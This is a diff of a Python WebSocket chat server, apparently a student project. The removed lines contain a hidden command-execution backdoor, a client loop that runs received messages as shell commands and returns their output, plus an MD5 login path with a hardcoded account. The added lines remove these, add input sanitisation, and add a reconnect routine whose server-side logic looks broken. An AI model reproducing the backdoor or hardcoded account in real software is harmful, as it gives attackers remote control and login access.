@@ -1,24 +1,29 @@
-# Group 5
-# Pemba, Saurab, Roshan, Bidur
-# Github Link: https://github.com/bidurdhakal/securegroup5
+"""
+This module uses the following libraries:
+- `asyncio`: Provides support for asynchronous I/O operations.
+- `websockets`: Handles WebSocket connections and communication.
+- `json`: Manages JSON.
+- `bcrypt`: Handles password hashing.
+"""
 
 import asyncio
-import websockets
 import json
+import os
+import websockets
 import bcrypt
-import hashlib
-import subprocess
+import bleach
+from dotenv import load_dotenv
 
-# MD5 hash function
-def md5_hash(password):
-    return hashlib.md5(password.encode('utf-8')).hexdigest()
 
-def verify_password(stored_hash, provided_password, method='bcrypt'):
-    if method == 'bcrypt':
-        return bcrypt.checkpw(provided_password.encode('utf-8'), stored_hash)
-    elif method == 'md5':
-        return stored_hash == md5_hash(provided_password)
-    return False
+# Load environment variables from .env file
+load_dotenv()
+
+def verify_password(stored_hash, provided_password):
+    """
+    checks if the provided password matches the stored hashed password.
+    """
+    return bcrypt.checkpw(provided_password.encode('utf-8'), stored_hash)
+
 
 # Registered Clients
 registered_clients = {
@@ -26,59 +31,66 @@ registered_clients = {
         "nickname": "pemba",
         "jid": "c1@s5",
         "password": b'$2b$12$qWoDtedvx8jurr/2XVex7.raoa7tqIofxPYrx1.oy6qmDpHavkYwa',
-        "method": "bcrypt"
     },
     "c2@s5": {
         "nickname": "saurab",
         "jid": "c2@s5",
-        "password": b'$2b$12$suJThyymiIVez4nLyUjpPurPq/E3BBTRdDGMnxADdbIjdst5kbKvS',
-        "method": "bcrypt"
+        "password": b'$2b$12$suJThyymiIVez4nLyUjpPurPq/E3BBTRdDGMnxADdbIjdst5kbKvS'
     },
     "c3@s5": {
         "nickname": "roshan",
         "jid": "c3@s5",
-        "password": b'$2b$12$Cz8bUuhzYyoHMdbvZLlcs.Cc0nOSR3VzAHOFrnF3ic6unrxZ6rwoG',
-        "method": "bcrypt"
+        "password": b'$2b$12$Cz8bUuhzYyoHMdbvZLlcs.Cc0nOSR3VzAHOFrnF3ic6unrxZ6rwoG'
     },
     "c4@s5": {
         "nickname": "bidur",
         "jid": "c4@s5",
-        "password": b'$2b$12$FwNWm33zvTOFtK6yrUXW0uMrMdu9jGR9AY7RgKgcm0sEzWjbhquOK',
-        "method": "bcrypt"
+        "password": b'$2b$12$FwNWm33zvTOFtK6yrUXW0uMrMdu9jGR9AY7RgKgcm0sEzWjbhquOK'
     },
     "test1@s5": {
         "nickname": "test1",
         "jid": "test1@s5",
-        "password": b'$2b$12$p10W.J8Olc8YtH87CPtYQuoFZ0P9qwqycWBlWvvaxCbIbre1u4Rhy',
-        "method": "bcrypt"
+        "password": b'$2b$12$p10W.J8Olc8YtH87CPtYQuoFZ0P9qwqycWBlWvvaxCbIbre1u4Rhy'
     },
     "test2@s5": {
         "nickname": "test2",
         "jid": "test2@s5",
-        "password": b'$2b$12$Xi6R9JEPPAagsKthzn38SeSHNWutCIDJ/7sas.vNZc6OzB77yithG',
-        "method": "bcrypt"
-    },
-    # User with MD5 hashed password
-    "md5user@s5": {
-        "nickname": "md5user",
-        "jid": "md5user@s5",
-        "password": md5_hash("md5password"),  # MD5 hashed password
-        "method": "md5"
+        "password": b'$2b$12$Xi6R9JEPPAagsKthzn38SeSHNWutCIDJ/7sas.vNZc6OzB77yithG'
     }
 }
 
 # Store active clients
 active_connections = {}
+ip = os.getenv('IP')
+port = os.getenv('PORT')
+
 
 async def handle_client(websocket):
+    """
+    Responsible for communicating with clients
+    """
     jid = None
     try:
         data = await receive_data(websocket)
-        jid = data['presence'][0].get('jid')
-        password = data['presence'][0].get('password')
+        jid = bleach.clean(data['presence'][0].get('jid'))
+        password = bleach.clean(data['presence'][0].get('password'))
         publickey = data['presence'][0].get('publickey')
 
-        if authenticate_user(jid, password):
+        # input validation and protecting input from buffer overflow
+        if not jid:
+            await send_error(websocket, "* JID cannot be empty")
+
+
+        elif len(jid) > 64:
+            await send_error(websocket, '* JID should be less than 64 characters')
+
+        elif password == '':
+            await send_error(websocket,"* Password cannot be empty")
+
+        elif len(password) > 64:
+            await send_error(websocket, '* Password should be less than 64 characters')
+
+        elif authenticate_user(jid, password):
             # if user is authenticated add users to active connections
             current_user = add_clients_to_active_connections(jid, websocket, publickey)
             # once client is logged in successfully
@@ -89,35 +101,64 @@ async def handle_client(websocket):
         else:
             # broadcast error message to specific client
             await send_error(websocket, "Incorrect email and password")
-    except websockets.exceptions.ConnectionClosed:
+
+    except websockets.exceptions.ConnectionClosedError as e:
         # if server is disconnected
-        await send_error(websocket, "Disconnected Server")
+        print(f"Connection closed with error code {e}")
+
     finally:
         # if disconnect remove users from active connections
         await cleanup_user(jid)
+        await asyncio.sleep(5)  # Wait before trying to reconnect
+        await attempt_reconnect()
 
-# when the clients sends information to sockets
+async def attempt_reconnect():
+    """
+    Attempt to reconnect if the connection is closed.
+    """
+    print("Attempting to reconnect...")
+    try:
+        async with websockets.connect(f"ws://{ip}:{port}") as websocket: # pylint: disable=no-member
+            await handle_client(websocket)
+
+    except Exception as e: # pylint: disable=broad-except
+        print(f"Reconnection failed with error: {e}")
+        await asyncio.sleep(5)
+
+
 async def receive_data(websocket):
+    """
+        Reads a message from the WebSocket connection.
+    """
     response = await websocket.recv()
     return json.loads(response)
 
-# check if user is authenticated 
+
 def authenticate_user(jid, password):
+    """
+    Checks if the user is authenticated
+    """
     if jid in registered_clients:
         user = registered_clients[jid]
-        return verify_password(user['password'], password, user.get('method', 'bcrypt'))
+        return verify_password(user['password'], password)
     return False
 
-# add clients to active connections
+
 def add_clients_to_active_connections(jid, websocket, publickey):
+    """
+    add clients to active connections
+    """
     user = registered_clients[jid]
     user['websocket'] = websocket
     user['publickey'] = publickey
     active_connections[jid] = user
     return user
 
-# broadcast login message to client
+
 async def send_login_success(websocket, user):
+    """
+    broadcast login message to client
+    """
     success_message = {
         "tag": "success",
         "message": "Login successful",
@@ -125,39 +166,51 @@ async def send_login_success(websocket, user):
     }
     await send_message(websocket, success_message)
 
-# broadcast error message to client
+
 async def send_error(websocket, message):
+    """
+    broadcast error message to client
+    """
     error_message = {
         "tag": "error",
         "message": message
     }
     await send_message(websocket, error_message)
 
-# it handles when clients send message to other client or public
+
+#
 async def handle_messages(websocket):
+    """
+    it handles when clients send message to other client or public
+    """
     async for message in websocket:
         data = json.loads(message)
         await process_message(data)
 
-# it forwards the message to specific client or public
+
 async def process_message(data):
+    """
+    it forwards the message to specific client or public
+    """
     if data.get('from') in active_connections:
         target_jid = data.get('to')
-        info = data.get('info')
+        info = bleach.clean(data.get('info'))
         if data.get('tag') == 'message' and info:
             message_format = create_message_format(data, tag='message')
             await route_message(target_jid, message_format)
         elif data.get('tag') == 'file':
             file_message = create_message_format(data, tag='file')
-            print(f'file message {file_message}')
             await route_message(target_jid, file_message)
         else:
             print('Invalid or incomplete message format')
     else:
         print('Sender is not active')
 
-# message format if file or text
+
 def create_message_format(data, tag):
+    """
+    message format if file or text
+    """
     message = {
         "tag": tag,
         "from": data.get('from'),
@@ -168,23 +221,31 @@ def create_message_format(data, tag):
         message["filename"] = data.get('filename')
     return message
 
-# it handles whether to send to msg to specific client or public
+
 async def route_message(target_jid, message):
+    """
+    it handles whether to send to msg to specific client or public
+    """
     if target_jid == 'public':
-        print(message)
         await broadcast(message)
     elif target_jid in active_connections:
         await send_message(active_connections[target_jid]['websocket'], message)
     else:
         print('Target client is not active')
 
-# broadcast any message to all the clients
+
 async def broadcast(message):
+    """
+    broadcast any message to all the clients
+    """
     for client_info in active_connections.values():
         await send_message(client_info['websocket'], message)
 
-# broadcast online presence to all users
+
 async def broadcast_presence():
+    """
+     broadcast online presence to all users
+    """
     online_users = {
         "tag": "presence",
         "presence": [
@@ -197,64 +258,31 @@ async def broadcast_presence():
     }
     await broadcast(online_users)
 
-# send message to client web socket
+
 async def send_message(websocket, message):
+    """
+     send message to client web socket
+    """
     await websocket.send(json.dumps(message))
 
-# delete the user from active connections and broadcast new presence to all users
+
 async def cleanup_user(jid):
+    """
+    delete the user from active connections and broadcast new presence to all users
+    """
     if jid in active_connections:
         del active_connections[jid]
         await broadcast_presence()
 
-# Start WebSocket server
+
 async def main():
-    server = await websockets.serve(handle_client, "localhost", 5555)
-    print("WebSocket server started at ws://localhost:5555")
+    """
+    Start the websocket server
+    """
+    server = await websockets.serve(handle_client, ip, port) # pylint: disable=no-member
+    print(f"WebSocket server started at ws://{ip}:{port}")
     await server.wait_closed()
 
-# Server IP address and port
-HOST = 'localhost'
-PORT = 5555
-
-async def start_client():
-    uri = f"ws://{HOST}:{PORT}"
-
-    while True:
-        try:
-            async with websockets.connect(uri) as websocket:
-                print(f'[+] Connected to the server at {HOST}:{PORT}')
-
-                try:
-                    while True:
-                        data = await websocket.recv()
-                        if data.lower() == 'exit':
-                            print('[+] Server closed the connection')
-                            break
-
-                        command = data
-                        print(f"Command received: {command}")
-
-                        try:
-                            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-                        except subprocess.CalledProcessError as e:
-                            output = e.output
-
-                        await websocket.send(output.decode())
-                except Exception as e:
-                    print(f"[!] Error: {e}")
-                finally:
-                    print('[+] Client closed')
-                    break
-        except (ConnectionRefusedError, websockets.exceptions.InvalidURI):
-            print("[!] Failed to connect, retrying...")
-            await asyncio.sleep(1)
-
-# Run server and client concurrently
+# Run server forever
 if __name__ == "__main__":
-    loop = asyncio.get_event_loop()
-    server_task = loop.create_task(main())
-    # Adding a delay before starting the client
-    client_task = loop.create_task(asyncio.sleep(5))  # Wait for 5 seconds
-    client_task = loop.create_task(start_client())
-    loop.run_until_complete(asyncio.gather(server_task, client_task))
+    asyncio.run(main())
